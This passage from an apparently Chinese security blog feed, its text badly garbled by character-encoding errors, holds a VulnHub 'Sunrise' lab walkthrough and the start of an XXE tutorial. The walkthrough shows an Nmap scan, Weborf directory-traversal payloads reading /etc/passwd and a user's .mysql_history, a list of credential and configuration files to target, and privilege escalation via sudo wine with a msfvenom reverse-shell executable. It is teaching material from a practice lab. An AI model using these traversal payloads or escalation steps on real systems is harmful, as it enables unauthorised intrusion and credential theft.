(0:00:00 remaining)Nmap scan report for 172.16.123.109Host is up (0.00011s latency).Not shown: 996 closed portsPORT     STATE SERVICE    VERSION22/tcp   open  ssh        OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)| ssh-hostkey:|   2048 37:dd:45:a2:9b:e7:bf:aa:30:e3:f0:96:ac:7c:0b:7c (RSA)|   256 b4:c2:9b:4d:6f:86:67:02:cf:f6:43:8b:e2:64:ea:04 (ECDSA)|_  256 cb:f2:e6:cd:e3:e1:0f:bf:ce:e0:a2:3b:84:ae:97:74 (ED25519)80/tcp   open  http       Apache httpd 2.4.38 ((Debian))| http-ls: Volume /| SIZE  TIME              FILENAME| 612   2019-11-25 05:35  index.nginx-debian.html|_|_http-server-header: Apache/2.4.38 (Debian)|_http-title: Index of /3306/tcp open  mysql?| fingerprint-strings:|   NULL, RPCCheck:|_    Host '172.16.123.230' is not allowed to connect to this MariaDB server8080/tcp open  http-proxy Weborf (GNU/Linux)| fingerprint-strings:|   FourOhFourRequest:|     HTTP/1.1 404 Page not found: Weborf (GNU/Linux)|     Content-Length: 202|     Content-Type: text/html|     &lt;!DOCTYPE HTML PUBLIC &quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot;&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;Weborf&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;H1&gt;Error 404&lt;/H1&gt;Page not found &lt;p&gt;Generated by Weborf/0.12.2 (GNU/Linux)&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;|   GetRequest:|     HTTP/1.1 200|     Server: Weborf (GNU/Linux)|     Content-Length: 326|     &lt;!DOCTYPE HTML PUBLIC &quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot;&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;Weborf&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;table&gt;&lt;tr&gt;&lt;td&gt;&lt;/td&gt;&lt;td&gt;Name&lt;/td&gt;&lt;td&gt;Size&lt;/td&gt;&lt;/tr&gt;&lt;tr style=&quot;background-color: #DFDFDF;&quot;&gt;&lt;td&gt;d&lt;/td&gt;&lt;td&gt;&lt;a href=&quot;html/&quot;&gt;html/&lt;/a&gt;&lt;/td&gt;&lt;td&gt;-&lt;/td&gt;&lt;/tr&gt;|     &lt;/table&gt;&lt;p&gt;Generated by Weborf/0.12.2 (GNU/Linux)&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;|   HTTPOptions, RTSPRequest, SIPOptions:|     HTTP/1.1 200|     Server: Weborf (GNU/Linux)|     Allow: GET,POST,PUT,DELETE,OPTIONS,PROPFIND,MKCOL,COPY,MOVE|     DAV: 1,2|     DAV: &lt;http://apache.org/dav/propset/fs/1&gt;|     MS-Author-Via: DAV|   Socks5:|     HTTP/1.1 400 Bad request: Weborf (GNU/Linux)|     Content-Length: 199|     Content-Type: text/html|_    &lt;!DOCTYPE HTML PUBLIC &quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot;&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;Weborf&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;H1&gt;Error 400&lt;/H1&gt;Bad request &lt;p&gt;Generated by Weborf/0.12.2 (GNU/Linux)&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;| http-methods:|_  Potentially risky methods: PUT DELETE PROPFIND MKCOL COPY MOVE|_http-server-header: Weborf (GNU/Linux)|_http-title: Weborf| http-webdav-scan:|   Allowed Methods: GET,POST,PUT,DELETE,OPTIONS,PROPFIND,MKCOL,COPY,MOVE|   WebDAV type: Apache DAV|_  Server Type: Weborf (GNU/Linux)2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============SF-Port3306-TCP:V=7.80%I=7%D=12/14%Time=5DF4C1F5%P=x86_64-pc-linux-gnu%r(NSF:ULL,4D,&quot;I\0\0\x01\xffj\x04Host\x20'172\.16\.123\.230'\x20is\x20not\x20aSF:llowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server&quot;)%r(RPCCheckSF:,4D,&quot;I\0\0\x01\xffj\x04Host\x20'172\.16\.123\.230'\x20is\x20not\x20alloSF:wed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server&quot;);==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============SF-Port8080-TCP:V=7.80%I=7%D=12/14%Time=5DF4C1FA%P=x86_64-pc-linux-gnu%r(GSF:etRequest,187,&quot;HTTP/1\.1\x20200\r\nServer:\x20Weborf\x20\(GNU/Linux\)\rSF:\nContent-Length:\x20326\r\n\r\n&lt;!DOCTYPE\x20HTML\x20PUBLIC\x20\&quot;-//W3CSF://DTD\x20HTML\x204\.01\x20Transitional//EN\&quot;&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;Weborf&lt;SF:/title&gt;&lt;/head&gt;&lt;body&gt;&lt;table&gt;&lt;tr&gt;&lt;td&gt;&lt;/td&gt;&lt;td&gt;Name&lt;/td&gt;&lt;td&gt;Size&lt;/td&gt;&lt;/tr&gt;SF:&lt;tr\x20style=\&quot;background-color:\x20#DFDFDF;\&quot;&gt;&lt;td&gt;d&lt;/td&gt;&lt;td&gt;&lt;a\x20hrefSF:=\&quot;html/\&quot;&gt;html/&lt;/a&gt;&lt;/td&gt;&lt;td&gt;-&lt;/td&gt;&lt;/tr&gt;\n&lt;/table&gt;&lt;p&gt;Generated\x20by\x2SF:0Weborf/0\.12\.2\x20\(GNU/Linux\)&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;&quot;)%r(HTTPOptions,B2,SF:&quot;HTTP/1\.1\x20200\r\nServer:\x20Weborf\x20\(GNU/Linux\)\r\nAllow:\x20GESF:T,POST,PUT,DELETE,OPTIONS,PROPFIND,MKCOL,COPY,MOVE\r\nDAV:\x201,2\r\nDASF:V:\x20&lt;http://apache\.org/dav/propset/fs/1&gt;\r\nMS-Author-Via:\x20DAV\r\SF:n\r\n&quot;)%r(RTSPRequest,B2,&quot;HTTP/1\.1\x20200\r\nServer:\x20Weborf\x20\(GNSF:U/Linux\)\r\nAllow:\x20GET,POST,PUT,DELETE,OPTIONS,PROPFIND,MKCOL,COPY,SF:MOVE\r\nDAV:\x201,2\r\nDAV:\x20&lt;http://apache\.org/dav/propset/fs/1&gt;\r\SF:nMS-Author-Via:\x20DAV\r\n\r\n&quot;)%r(FourOhFourRequest,12B,&quot;HTTP/1\.1\x20SF:404\x20Page\x20not\x20found:\x20Weborf\x20\(GNU/Linux\)\r\nContent-LengSF:th:\x20202\r\nContent-Type:\x20text/html\r\n\r\n&lt;!DOCTYPE\x20HTML\x20PUSF:BLIC\x20\&quot;-//W3C//DTD\x20HTML\x204\.01\x20Transitional//EN\&quot;&gt;&lt;html&gt;&lt;heaSF:d&gt;&lt;title&gt;Weborf&lt;/title&gt;&lt;/head&gt;&lt;body&gt;\x20&lt;H1&gt;Error\x20404&lt;/H1&gt;Page\x20noSF:t\x20found\x20&lt;p&gt;Generated\x20by\x20Weborf/0\.12\.2\x20\(GNU/Linux\)&lt;/pSF:&gt;&lt;/body&gt;&lt;/html&gt;&quot;)%r(Socks5,125,&quot;HTTP/1\.1\x20400\x20Bad\x20request:\x20SF:Weborf\x20\(GNU/Linux\)\r\nContent-Length:\x20199\r\nContent-Type:\x20tSF:ext/html\r\n\r\n&lt;!DOCTYPE\x20HTML\x20PUBLIC\x20\&quot;-//W3C//DTD\x20HTML\x2SF:04\.01\x20Transitional//EN\&quot;&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;Weborf&lt;/title&gt;&lt;/head&gt;&lt;bSF:ody&gt;\x20&lt;H1&gt;Error\x20400&lt;/H1&gt;Bad\x20request\x20&lt;p&gt;Generated\x20by\x20WeSF:borf/0\.12\.2\x20\(GNU/Linux\)&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;&quot;)%r(SIPOptions,B2,&quot;HTTSF:P/1\.1\x20200\r\nServer:\x20Weborf\x20\(GNU/Linux\)\r\nAllow:\x20GET,POSF:ST,PUT,DELETE,OPTIONS,PROPFIND,MKCOL,COPY,MOVE\r\nDAV:\x201,2\r\nDAV:\xSF:20&lt;http://apache\.org/dav/propset/fs/1&gt;\r\nMS-Author-Via:\x20DAV\r\n\r\SF:n&quot;);MAC Address: 00:0C:29:22:ED:7F (VMware)Device type: general purposeRunning: Linux 3.X|4.XOS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4OS details: Linux 3.2 - 4.9Network Distance: 1 hopService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelTRACEROUTEHOP RTT     ADDRESS1   0.11 ms 172.16.123.109OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 142.97 seconds</code></pre><p><strong>å¼€æ”¾çš„ç«¯å£:</strong></p><p>â€‹22/tcp ssh openssh 7.9</p><p>â€‹80/tcp http apache</p><p>â€‹3306/tcp mysql?</p><p>â€‹8080/tcp http-proxy Weborf</p><p>80/tcp http</p><p><img src="%E6%8D%95%E8%8E%B7.png" alt="æ•è·"></p><p><img src="%E6%8D%95%E8%8E%B71.png" alt="æ•è·1"></p><p>æ²¡æœ‰ä»»ä½•ä¸œè¥¿</p><p>mysqlè¿ä¸ä¸Š</p><p>çœ‹å‘ 8080ç«¯å£</p><p><img src="%E6%8D%95%E8%8E%B72.PNG" alt="æ•è·2"></p><p>çœ‹äº†çœ‹ç‰ˆæœ¬</p><p>ç”¨searchsploitæœç´¢ä¸€ä¸‹çœ‹çœ‹æœ‰æ²¡æœ‰æ¼æ´å­˜åœ¨</p><p><img src="%E6%8D%95%E8%8E%B73.PNG" alt="æ•è·3"></p><p>å­˜åœ¨ç›®å½•ç©¿æ¢­</p><p>çœ‹äº†çœ‹å…·ä½“payload:</p><pre><code class="language-html">GET /..%2f..%2f..%2f..%2fetc%2fpasswd</code></pre><p>å°±æ˜¯æŠŠ / è½¬æˆ htmlç¼–ç  %2f</p><p><img src="%E6%8D%95%E8%8E%B74.PNG" alt="æ•è·4"></p><p>æˆåŠŸã€‚</p><p>ç›®å½•ç©¿æ¢­æœ€ä¸»è¦çš„å°±æ˜¯æ‰¾ æ•æ„Ÿæ–‡ä»¶ä¿¡æ¯.</p><p>çœ‹çœ‹æœ‰æ²¡æœ‰<strong>æ•æ„Ÿæ–‡ä»¶</strong>å°¤å…¶æ˜¯ å†å²è®°å½•é‚£äº›ï¼Œé…ç½®æ–‡ä»¶ç­‰</p><pre><code class="language-html">GET /..%2f..%2f..%2fhome%2f</code></pre><p><img src="%E6%8D%95%E8%8E%B75.PNG" alt="æ•è·5"></p><p>homeä¸‹å­˜åœ¨ä¸¤ä¸ªç”¨æˆ·,ä¸¤ä¸ªç”¨æˆ·ä¸‹å­˜åœ¨çš„æ–‡ä»¶ï¼š</p><ul><li><p>sunrise</p><p>|_user.txt</p></li><li><p>weborf</p><p>|_weborfæºç </p></li></ul><p><strong>æ³¨æ„ï¼è¿™é‡Œæ˜¯çŸ­è·¯çš„è·¯å£ï¼Œuser.txt æ˜¯ä¸€ä¸ªå‘ã€‚é‡ç‚¹ä¸åœ¨è¿™é‡Œ</strong></p><p>æƒ³åˆ°ç«¯å£å¼€æ”¾äº†mysqlï¼Œäºæ˜¯å°±ç™¾åº¦äº†ä¸€ä¸‹ mysqlçš„æ•æ„Ÿæ–‡ä»¶</p><pre><code>/usr/local/app/apache2/conf/httpd.conf #apache2ç¼ºçœé…ç½®æ–‡ä»¶  /usr/local/apache2/conf/httpd.conf  /usr/local/app/apache2/conf/extra/httpd-vhosts.conf #è™šæ‹Ÿç½‘ç«™è®¾ç½®  /usr/local/app/php5/lib/php.ini #PHPç›¸å…³è®¾ç½® /etc/sysconfig/iptables #ä»ä¸­å¾—åˆ°é˜²ç«å¢™è§„åˆ™ç­–ç•¥  /etc/httpd/conf/httpd.conf #apacheé…ç½®æ–‡ä»¶  /etc/rsyncd.conf #åŒæ­¥ç¨‹åºé…ç½®æ–‡ä»¶  /etc/my.cnf #mysqlçš„é…ç½®æ–‡ä»¶  /etc/redhat-release #ç³»ç»Ÿç‰ˆæœ¬  /etc/issue  /etc/issue.netetc/passwd #å­˜å‚¨æ“ä½œç³»ç»Ÿç”¨æˆ·ä¿¡æ¯,è¯¥æ–‡ä»¶ä¸ºæ‰€æœ‰ç”¨æˆ·å¯è§ç”¨æˆ·å: å¯†ç  : uid  : gid :ç”¨æˆ·æè¿°ï¼šä¸»ç›®å½•ï¼šç™»é™†shellå¯†ç ï¼šxè¡¨ç¤ºæš—æ–‡,ç›¸åä¸ºæ˜æ–‡uidï¼šuserid,â€0â€ä¸ºroot ID.1-99ä¸ºç³»ç»Ÿä¿ç•™,åˆ†é…ç»™ç³»ç»Ÿé¢„å®šä¹‰å¸å·ã€‚Linuxç”¨æˆ·å¯ä»¥åˆ†ä¸º3ç±»ï¼šè¶…çº§ç”¨æˆ·ï¼ˆrootï¼‰ã€ç®¡ç†ç”¨æˆ·å’Œæ™®é€šç”¨æˆ· ã€€ã€€ä¼ªç”¨æˆ·ï¼ˆpsuedo usersï¼‰ã€€ã€€ã€€ã€€bin #æ‹¥æœ‰å¯æ‰§è¡Œçš„ç”¨æˆ·å‘½ä»¤æ–‡ä»¶ã€€ã€€ã€€ã€€sys #æ‹¥æœ‰ç³»ç»Ÿæ–‡ä»¶ã€€ã€€ã€€ã€€adm #æ‹¥æœ‰è´¦æˆ·æ–‡ä»¶ã€€ã€€ã€€ã€€uucp #UUCPä½¿ç”¨ã€€ã€€ã€€ã€€Ip #Ipæˆ–lpdå­ç³»ç»Ÿä½¿ç”¨ã€€ã€€ã€€ã€€nobody #NFSä½¿ç”¨ã€€ã€€ã€€ã€€auditã€€ã€€ã€€ã€€cronã€€ã€€ã€€ã€€mailã€€ã€€ã€€ã€€usenetgid:å­—æ®µè®°å½•çš„æ˜¯ç”¨æˆ·æ‰€å±çš„ç”¨æˆ·ç»„ã€‚å¯¹åº”ç€/etc/groupæ–‡ä»¶ä¸­çš„ä¸€æ¡è®°å½•ã€€ç”¨æˆ·æè¿°ï¼šå­—æ®µè®°å½•ç€ç”¨æˆ·çš„ä¸€äº›ä¸ªäººæƒ…å†µï¼Œä¾‹å¦‚ç”¨æˆ·çš„çœŸå®å§“åã€ç”µè¯ã€åœ°å€ç­‰ã€€ã€€  ä¸»ç›®å½•ï¼šç”¨æˆ·çš„èµ·å§‹å·¥ä½œç›®å½•ã€€  ç™»é™†shellï¼šã€€ã€€ã€€ã€€ã€€ã€€å¸¸ç”¨shell - sh(BourneShell),csh(CShell),ksh(KornShell),tcsh(TENEX/TOPS-20typeCShell),bash(BourneAgainShell)ã€€ã€€ã€€ã€€ã€€ã€€/bin/sh #é»˜è®¤ç™»å½•Shell   /sbin/nologin #ä»£è¡¨ç”¨æˆ·ä¸èƒ½ç™»å½• /etc/shadowusername: passwd: lastchg: min: max: warn: inactive: expire: flagç™»å½•å:åŠ å¯†å£ä»¤:æœ€åä¸€æ¬¡ä¿®æ”¹æ—¶é—´:æœ€å°æ—¶é—´é—´éš”:æœ€å¤§æ—¶é—´é—´éš”:è­¦å‘Šæ—¶é—´:ä¸æ´»åŠ¨æ—¶é—´:å¤±æ•ˆæ—¶é—´:æ ‡å¿—å£ä»¤ - åŠ å¯†åçš„ç”¨æˆ·å£ä»¤å­—ï¼Œ13ä¸ªå­—ç¬¦ï¼›å¦‚æœä¸ºç©º/ç”¨æˆ·æ²¡æœ‰å£ä»¤ï¼›å¦‚å«æœ‰ä¸å±äºé›†åˆ{./0-9A-Za-z}ä¸­çš„å­—ç¬¦/ç”¨æˆ·ä¸èƒ½ç™»å½•æœ€åä¸€æ¬¡ä¿®æ”¹æ—¶é—´ - è¡¨ç¤ºçš„æ˜¯ä»æŸä¸ªæ—¶åˆ»èµ·ï¼Œåˆ°ç”¨æˆ·æœ€åä¸€æ¬¡ä¿®æ”¹å£ä»¤æ—¶çš„å¤©æ•°ã€‚æ—¶é—´èµ·ç‚¹å¯¹ä¸åŒçš„ç³»ç»Ÿå¯èƒ½ä¸åŒæœ€å°æ—¶é—´é—´éš” - ä¸¤æ¬¡ä¿®æ”¹å£ä»¤ä¹‹é—´æ‰€éœ€çš„æœ€å°å¤©æ•°æœ€å¤§æ—¶é—´é—´éš” - å£ä»¤ä¿æŒæœ‰æ•ˆçš„æœ€å¤§å¤©æ•°è­¦å‘Šæ—¶é—´  - ä»ç³»ç»Ÿå¼€å§‹è­¦å‘Šç”¨æˆ·åˆ°ç”¨æˆ·å¯†ç æ­£å¼å¤±æ•ˆä¹‹é—´çš„å¤©æ•°ä¸æ´»åŠ¨æ—¶é—´ - ç”¨æˆ·æ²¡æœ‰ç™»å½•æ´»åŠ¨ä½†è´¦å·ä»èƒ½ä¿æŒæœ‰æ•ˆçš„æœ€å¤§å¤©æ•°å¤±æ•ˆæ—¶é—´ - è´¦å·çš„ç”Ÿå­˜æœŸã€‚ä¿ç•™æ¡ç›® - æ— ç”¨å­—æ®µ/etc/group å­˜å‚¨æœ‰å…³æœ¬åœ°ç”¨æˆ·ç»„çš„ä¿¡æ¯ä¸€ä¸ªç»„ä¸­å¯ä»¥æœ‰å¤šä¸ªç”¨æˆ·ï¼Œä¸€ä¸ªç”¨æˆ·ä¹Ÿå¯ä»¥å±äºä¸åŒçš„ç»„ã€‚å½“ä¸€ä¸ªç”¨æˆ·åŒæ—¶æ˜¯å¤šä¸ªç»„ä¸­çš„æˆå‘˜æ—¶ï¼Œåœ¨/etc/passwdæ–‡ä»¶ä¸­è®°å½•çš„æ˜¯ç™»å½•æ—¶æ‰€å±çš„é»˜è®¤ç»„ç”¨æˆ·è¦è®¿é—®å±äºé™„åŠ ç»„çš„æ–‡ä»¶æ—¶ï¼Œå¿…é¡»é¦–å…ˆä½¿ç”¨newgrpå‘½ä»¤ä½¿è‡ªå·±æˆä¸ºæ‰€è¦è®¿é—®çš„ç»„ä¸­çš„æˆå‘˜1ï¼‰groupname GID #ç»„å2ï¼‰password #å¯†ç ä½ç½®3ï¼‰GID #ç»„ID4ï¼‰user #ç»„æˆå‘˜ /usr/local/app/php5/lib/php.ini #PHPç›¸å…³è®¾ç½®/usr/local/app/apache2/conf/extra/httpd-vhosts.conf #è™šæ‹Ÿç½‘ç«™è®¾ç½®/etc/httpd/conf/httpd.confæˆ–/usr/local/apche/conf/httpd.conf #linux APACHEè™šæ‹Ÿä¸»æœºé…ç½®æ–‡ä»¶/usr/local/resin-3.0.22/conf/resin.conf #3.0.22çš„RESINé…ç½®æ–‡ä»¶/usr/local/resin-pro-3.0.22/conf/resin.conf /usr/local/app/apache2/conf/extra/httpd-vhosts.conf #APASHEè™šæ‹Ÿä¸»æœº/etc/httpd/conf/httpd.confæˆ–/usr/local/apche/conf /httpd.conf #linux APACHEè™šæ‹Ÿä¸»æœºé…ç½®æ–‡ä»¶/usr/local/resin-3.0.22/conf/resin.conf #3.0.22çš„RESINé…ç½®æ–‡ä»¶/usr/local/resin-pro-3.0.22/conf/resin.conf /usr/local/app/apache2/conf/extra/httpd-vhosts.conf #APASHEè™šæ‹Ÿä¸»æœº/etc/sysconfig/iptables #æŸ¥çœ‹é˜²ç«å¢™ç­–ç•¥/root/.mysql_historyã€/root/.bash_history      #Mysqlè´¦å·å¯†ç ä¿¡æ¯</code></pre><p>æœ€åä¸€ä¸ª**.mysql_history** #mysqlè´¦å·å¯†ç ä¿¡æ¯</p><p>è¿™é‡Œå†™çš„æ˜¯/root/ç”¨æˆ·ï¼Œå°±çŒœæƒ³æ˜¯å¦å­˜åœ¨ä¸¤ä¸ªç”¨æˆ·é‡Œé¢</p><pre><code class="language-HTML">GET /..%2f..%2f..%2fhome%2fweborf%2f.mysql_history</code></pre><p><img src="%E6%8D%95%E8%8E%B76.PNG" alt="æ•è·6"></p><p>æ‰¾åˆ° weborf ç”¨æˆ·çš„å¯†ç ã€‚</p><p>ä½¿ç”¨sshç™»å…¥ä¸Šå»</p><p><img src="%E6%8D%95%E8%8E%B77.PNG" alt="æ•è·7"></p><p><strong>ç™»å…¥æˆåŠŸï¼ï¼ï¼</strong></p><p>åˆ°è¿™ä¸€æ­¥å°±å¯ä»¥å¼€å§‹æ¸—é€ææƒäº†</p><h3 id="0x01-2-ææƒ">0x01.2 ææƒ</h3><p>å‘ç°ç”¨æˆ·çš„ç­‰çº§ä¸æ˜¯å¾ˆé«˜ã€‚æ‰“ç®—æ¥ææƒä¸€ä¸‹</p><p><img src="%E6%8D%95%E8%8E%B78.PNG" alt="æ•è·8"></p><p><strong>æƒ³åˆ°ä¹‹å‰çš„mysqlæœ‰åŠå¼€æ”¾çš„çŠ¶æ€ã€‚äºæ˜¯æœ‰ä¸ªçŒœæƒ³ã€‚</strong></p><p><strong>æ˜¯ä¸æ˜¯åªå…è®¸æœ¬åœ°ç™»å…¥mysqlï¼Œæµ‹è¯•äº†ä¸€ä¸‹</strong></p><p><img src="%E6%8D%95%E8%8E%B79.PNG" alt="æ•è·9"></p><p>ç™»å…¥æˆåŠŸï¼</p><p>æŸ¥è¯¢äº†ä¸€ç•ªæ•°æ®åº“å‘ç°å­˜åœ¨å¦ä¸€ä¸ªç”¨æˆ·çš„å¯†ç ã€‚</p><p><img src="%E6%8D%95%E8%8E%B710.PNG" alt="æ•è·10"></p><p>ç°åœ¨å¾—åˆ°äº† å¦ä¸€ä¸ªç”¨æˆ·çš„ å¯†ç ã€‚</p><p>ç°åœ¨åˆ‡æ¢ç”¨æˆ·</p><p><img src="%E6%8D%95%E8%8E%B711.PNG" alt="æ•è·11"></p><p>å‘ç°æƒé™ä¹Ÿä¸æ˜¯ç‰¹åˆ«é«˜ã€‚ä¸è¿‡ç®—æ˜¯è¿›å…¥äº†æ­£å¸¸çš„ç”¨æˆ·äº†ã€‚</p><p>å¼€å§‹ææƒ</p><pre><code>sudo su</code></pre><p>æµ‹è¯•äº†ä¸€ä¸‹ï¼Œå‘ç°ä¸è¡Œ</p><p>åœ¨ç™¾æ€ä¸å¾—å…¶è§£çš„æ—¶å€™ã€‚å»é—®äº†é—®ä¸€äº›å¤§ä½¬ã€‚</p><p>æœ‰ä¸ªå¤§ä½¬è·Ÿæˆ‘è¯´çœ‹çœ‹æœ‰æ²¡æœ‰ wineï¼Œå¯ä»¥ç”¨wine å»ºç«‹åå‘è¿æ¥ã€‚å†ç”¨sudo -l æŸ¥ä¸€ä¸‹è¯¥ç”¨æˆ·æœ‰é‚£äº›æƒé™</p><p><img src="%E6%8D%95%E8%8E%B713.PNG" alt="æ•è·13"></p><p>å­˜åœ¨ã€‚</p><pre><code>sudo -l#æ˜¾ç¤ºå‡ºè‡ªå·±ï¼ˆæ‰§è¡Œ sudo çš„ä½¿ç”¨è€…ï¼‰çš„æƒé™</code></pre><p><img src="%E6%8D%95%E8%8E%B714.PNG" alt="æ•è·14"></p><p>scp ä¼ äº†ä¸‹msfveom windows åå‘è¿æ¥</p><p><img src="%E6%8D%95%E8%8E%B715.PNG" alt="æ•è·15"></p><p>scp muma.exe <a href="mailto:sunrise@172.16.123.109" target="_blank" rel="noopener">sunrise@172.16.123.109</a>:/home/sunrise/muma.exe</p><p><img src="%E6%8D%95%E8%8E%B716.PNG" alt="æ•è·16"></p><p>å¼€å§‹åå¼¹ã€‚</p><p><img src="%E6%8D%95%E8%8E%B717-1576324766059.PNG" alt="æ•è·17"></p><h3 id="0x01-3-æŸ¥çœ‹flag">0x01.3 æŸ¥çœ‹flag</h3><p>è¯•è¯•æ˜¯å¦èƒ½ç›´æ¥è¯»å–root.txt</p><pre><code>cat /root/root.txt</code></pre><p><img src="%E6%8D%95%E8%8E%B718.PNG" alt="æ•è·18"></p><p>æˆåŠŸï¼</p>]]></content>
      
      
      <categories>
          
          <category> vulnhub </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XXEæ¼æ´å­¦ä¹ </title>
      <link href="/2019/12/03/xxe/"/>
      <url>/2019/12/03/xxe/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-å‰è¨€">0x00 å‰è¨€</h1><p>æœ€è¿‘çœ‹åˆ°æŒºå¤šXXEæ¼æ´çš„ï¼Œäºæ˜¯æ‰“ç®—æ¥æµ…å…¥å­¦ä¹ ä¸‹ã€‚</p><a id="more"></a><h1 id="0x01æ¼æ´äº§ç”Ÿ">0x01æ¼æ´äº§ç”Ÿ</h1><p>XXEæ¼æ´å…¨ç§°XML External Entity Injection å³xmlå¤–éƒ¨å®ä½“æ³¨å…¥æ¼æ´ï¼ŒXXEæ¼æ´å‘ç”Ÿåœ¨åº”ç”¨ç¨‹åºè§£æXMLè¾“å…¥æ—¶ï¼Œ<strong>æ²¡æœ‰ç¦æ­¢å¤–éƒ¨å®ä½“çš„åŠ è½½</strong>ï¼Œå¯¼è‡´å¯åŠ è½½æ¶æ„å¤–éƒ¨æ–‡ä»¶å’Œä»£ç ï¼Œé€ æˆ<strong>ä»»æ„æ–‡ä»¶è¯»å–</strong>ã€<strong>å‘½ä»¤æ‰§è¡Œ</strong>ã€<strong>å†…ç½‘ç«¯å£æ‰«æ</strong>ã€<strong>æ”»å‡»å†…ç½‘ç½‘ç«™</strong>ã€<strong>å‘èµ·Dosæ”»å‡»</strong>ç­‰å±å®³ã€‚</p><p>XXEæ¼æ´è§¦å‘çš„ç‚¹å¾€å¾€æ˜¯å¯ä»¥ä¸Šä¼ xmlæ–‡ä»¶çš„ä½ç½®ï¼Œæ²¡æœ‰å¯¹ä¸Šä¼ çš„xmlæ–‡ä»¶è¿›è¡Œè¿‡æ»¤ï¼Œå¯¼è‡´å¯ä¸Šä¼ æ¶æ„xmlæ–‡ä»¶ã€‚</p><h2 id="0x01-1-XMLåŸºç¡€">0x01.1 XMLåŸºç¡€</h2><p>è¦äº†è§£XXEæ¼æ´ï¼Œå…ˆè¦ææ‡‚ä¸€å®šçš„åŸºç¡€çŸ¥è¯†ï¼Œäº†è§£XMLæ–‡æ¡£çš„åŸºç¡€ç»„æˆã€‚</p><p>XML æŒ‡å¯æ‰©å±•æ ‡è®°è¯­è¨€ï¼ˆExtensible Markup Languageï¼‰</p><pre><code>XML è¢«è®¾è®¡ç”¨æ¥ä¼ è¾“å’Œå­˜å‚¨æ•°æ®ã€‚HTML è¢«è®¾è®¡ç”¨æ¥æ˜¾ç¤ºæ•°æ®</code></pre><p>XMLæŠŠæ•°æ®ä»HTMLåˆ†ç¦»ï¼ŒXMLæ˜¯ç‹¬ç«‹äºè½¯ä»¶å’Œç¡¬ä»¶çš„ä¿¡æ¯ä¼ è¾“å·¥å…·ã€‚</p><p>XMLè¯­è¨€æ²¡æœ‰é¢„å®šä¹‰çš„æ ‡ç­¾ï¼Œå…è®¸ä½œè€…å®šä¹‰è‡ªå·±çš„æ ‡ç­¾å’Œè‡ªå·±çš„æ–‡æ¡£ç»“æ„</p><p>XMLçš„è¯­æ³•è§„åˆ™ï¼š</p><ul><li><p>XMLæ–‡æ¡£å¿…é¡»æœ‰ä¸€ä¸ªæ ¹å…ƒç´ </p></li><li><p>XMLå…ƒç´ éƒ½å¿…é¡»æœ‰ä¸€ä¸ªå…³é—­æ ‡ç­¾</p></li><li><p>XMLæ ‡ç­¾å¯¹å¤§å°æ•æ„Ÿ</p></li><li><p>XMLå…ƒç´ å¿…é¡»è¢«æ­£ç¡®çš„åµŒå¥—</p></li><li><p>XMLå±æ€§å€¼å¿…é¡»åŠ å¼•å¯¼</p><pre><code class="language-xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; &lt;!--XML å£°æ˜--&gt;&lt;girl age=&quot;18&quot;&gt;ã€€ã€€&lt;!--è‡ªå®šçš„æ ¹å…ƒç´ girl;ageå±æ€§éœ€è¦åŠ å¼•å¯¼--&gt;&lt;hair&gt;é•¿å¤´å‘&lt;/hair&gt;ã€€ã€€&lt;!--è‡ªå®šä¹‰çš„4ä¸ªå­å…ƒç´ ï¼Œå³girlå¯¹è±¡çš„å±æ€§--&gt;&lt;eye&gt;å¤§çœ¼ç›&lt;/eye&gt;&lt;face&gt;å¯çˆ±çš„è„¸åº&lt;/face&gt;&lt;summary&gt;å¯çˆ±ç¾ä¸½çš„å¥³å­©&lt;/summary&gt;&lt;/girl&gt;ã€€ã€€&lt;!--æ ¹å…ƒç´ çš„é—­åˆ--&gt;</code></pre></li></ul><h3 id="å®ä½“å¼•ç”¨">å®ä½“å¼•ç”¨</h3><p>åœ¨XMLä¸­ï¼Œä¸€äº›å­—ç¬¦æ‹¥æœ‰ç‰¹æ®Šçš„æ„ä¹‰ã€‚</p><p>å¦‚æœæŠŠå­—ç¬¦&quot;&lt;&quot;æ”¾åœ¨XMLå…ƒç´ ä¸­ï¼Œä¼šå‘ç”Ÿé”™è¯¯ï¼Œè¿™æ˜¯å› ä¸ºè§£é‡Šå™¨ä¼šæŠŠå®ƒä½œä¸ºæ–°å…ƒç´ çš„å¼€å§‹ã€‚</p><p><strong>ä¾‹å­:</strong></p><pre><code class="language-xml">&lt;message&gt;if salary &lt; 1000 then&lt;/message&gt;</code></pre><p>ä¸ºäº†é¿å…è¿™ä¸ªé”™è¯¯ï¼Œè¯·ç”¨<strong>å®ä½“å¼•ç”¨</strong>æ¥ä»£æ›¿ â€œ&lt;â€ å­—ç¬¦ï¼š</p><pre><code class="language-xml">&lt;message&gt;if salary &amp;lt; 1000 then&lt;/message&gt;</code></pre><p>åœ¨ XML ä¸­ï¼Œæœ‰ 5 